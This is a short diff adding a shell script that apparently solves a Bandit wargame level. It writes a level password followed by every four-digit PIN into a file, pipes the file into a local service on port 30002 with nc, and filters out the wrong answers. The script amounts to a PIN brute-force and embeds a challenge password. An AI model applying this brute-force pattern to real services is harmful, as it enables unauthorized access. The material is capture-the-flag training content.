@@ -1,0 +1,14 @@
+nc localhost 30002
+cd /tmp
+mktemp -d
+cd  /tmp/tmp.nbeZx2UY3s
+for number in {0000..0002}; do echo $number; done
+
+for number in {0000..9999}; do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8" $number >> bandit24_options.txt; done
+
+head -20 bandit24_options.txt
+cat bandit24_options.txt | nc localhost 30002 > output.txt
+grep -v "Wrong" output.txt
+
+cd /tmp
+rm -rf /tmp/tmp.nbeZx2UY3s
